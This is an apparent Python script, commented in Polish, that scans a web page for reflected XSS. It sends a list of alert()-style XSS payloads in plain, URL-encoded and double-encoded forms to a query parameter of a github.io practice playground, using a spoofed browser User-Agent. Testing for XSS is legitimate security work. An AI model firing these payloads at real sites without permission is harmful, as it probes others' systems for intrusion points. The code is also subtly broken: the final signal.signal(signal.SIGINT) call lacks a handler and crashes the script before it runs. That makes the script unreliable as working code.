import urllib.request
import urllib.parse
import urllib.error
import time
import sys
import signal
from urllib.parse import quote

# Lista testowych payloadów XSS
XSS_PAYLOADY = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(2)>",
    "javascript:alert(3)",
    "<body onload=alert(5)>",
    "<svg onload=alert(6)>",
    "//<script>alert(7)</script>",
    "<iframe src=javascript:alert(8)>",
    "<a href=javascript:alert(9)>click</a>",
    "<div style=background-image:url(javascript:alert(10))>",
    "\u003cscript\u003ealert(11)\u003c/script\u003e"
]

# Konfiguracja testu
URL_DO_TESTOWANIA = "https://ashkiani.github.io/sql-injection-playground/"
NAZWA_PARAMETRU = "q"

# Nagłówki HTTP (symulacja przeglądarki)
NAGLOWKI_HTTP = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'close'
}

# Funkcja do testowania payloadów XSS
def testuj_xss(url, parametr, payloady):
    for payload in payloady:
        print(f"\n[!] Testowanie payloadu: {payload}")

        for kodowanie, wartosc in {
            "oryginalny": payload,
            "URL-encoded": quote(payload),
            "podwójnie URL-encoded": quote(quote(payload))
        }.items():
            try:
                zapytanie = urllib.parse.urlencode({parametr: wartosc})
                pelny_url = f"{url}?{zapytanie}"
                req = urllib.request.Request(pelny_url, headers=NAGLOWKI_HTTP)
                with urllib.request.urlopen(req, timeout=5) as odpowiedz:
                    sprawdz_odpowiedz(odpowiedz, payload, kodowanie)
                time.sleep(0.5)  # Pauza między żądaniami
            except urllib.error.URLError as blad:
                print(f"[X] Błąd połączenia: {blad}")
                continue

# Sprawdzanie odpowiedzi pod kątem XSS
def sprawdz_odpowiedz(odpowiedz, payload, typ_kodowania):
    if odpowiedz.status != 200:
        print(f"[!] Odpowiedź HTTP: {odpowiedz.status}")
        return

    tresc = odpowiedz.read().decode('utf-8', errors='ignore')
    if payload in tresc:
        print(f"[✔] Potencjalna podatność XSS wykryta ({typ_kodowania})!")
    else:
        print(f"[ ] Brak podatności w wersji: {typ_kodowania}.")

# Główna funkcja
def main():
    print("=== Rozpoczynanie testu XSS ===")
    testuj_xss(URL_DO_TESTOWANIA, NAZWA_PARAMETRU, XSS_PAYLOADY)
    print("\n=== Testowanie zakończone ===")

if __name__ == "__main__":
    signal.signal(signal.SIGINT)
    main()
